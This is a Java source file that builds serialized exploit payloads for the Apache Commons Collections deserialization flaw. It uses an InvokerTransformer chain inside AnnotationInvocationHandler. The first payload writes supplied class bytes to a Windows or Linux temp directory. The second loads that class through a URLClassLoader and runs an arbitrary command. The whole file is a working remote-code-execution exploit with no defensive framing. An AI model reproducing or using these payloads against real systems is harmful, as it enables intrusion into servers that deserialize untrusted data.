import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.ByteArrayOutputStream;
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.net.URL;
import java.net.URLClassLoader;
import java.util.HashMap;
import java.util.Map;

/**
 * Created by Keen on 5/20/2017.
 */
public class PayLoad {

    //send first payload
    public static byte[] FirstPayload(String os, byte[] Classofbyte) throws Exception{

        String TempFilePath = "c:/windows/temp/ExecuteCommand.class";
        if(os.equals("Linux")){
            TempFilePath = "/tmp/ExecuteCommand.class";
        }

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(FileOutputStream.class),
                new InvokerTransformer("getConstructor", new Class[]{Class[].class}, new Object[]{new Class[]{String.class}}),
                new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new String[]{TempFilePath}}),
                new InvokerTransformer("write", new Class[]{byte[].class}, new Object[]{Classofbyte})
        };

        Transformer transformerChain = new ChainedTransformer(transformers);
        Map innermap = new HashMap();
        innermap.put("value", "value");
        Map outerMap = TransformedMap.decorate(innermap, null, transformerChain);
        Class cls = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor ctor = cls.getDeclaredConstructor(Class.class, Map.class);
        ctor.setAccessible(true);
        Object instance = ctor.newInstance(Retention.class, outerMap);


        ByteArrayOutputStream bAops = new ByteArrayOutputStream(10);
        ObjectOutputStream out = new ObjectOutputStream(bAops);
        out.writeObject(instance);
        out.flush();
        out.close();
        return bAops.toByteArray();
    }



    //send command payload
    public static byte[] CommandPayload(String os, String cmd) throws Exception{

        String ClassPath = "file:/c:/windows/temp/";
        if(!os.equals("Windows")){
            ClassPath = "file:/tmp/";
        }

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(URLClassLoader.class),
                new InvokerTransformer("getConstructor", new Class[]{Class[].class}, new Object[]{new Class[]{URL[].class}}),
                new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new Object[]{new URL[]{new URL(ClassPath)}}}),
                new InvokerTransformer("loadClass", new Class[]{String.class}, new Object[]{"ExecuteCommand"}),
                new InvokerTransformer("getConstructor", new Class[]{Class[].class}, new Object[]{new Class[]{String.class}}),
                new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new Object[]{cmd}})
        };

        Transformer transformerChain = new ChainedTransformer(transformers);
        Map innermap = new HashMap();
        innermap.put("value", "value");
        Map outerMap = TransformedMap.decorate(innermap, null, transformerChain);
        Class cls = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor ctor = cls.getDeclaredConstructor(Class.class, Map.class);
        ctor.setAccessible(true);
        Object instance = ctor.newInstance(Retention.class, outerMap);


        ByteArrayOutputStream bAops = new ByteArrayOutputStream(10);
        ObjectOutputStream out = new ObjectOutputStream(bAops);
        out.writeObject(instance);
        out.flush();
        out.close();
        return bAops.toByteArray();
    }


}
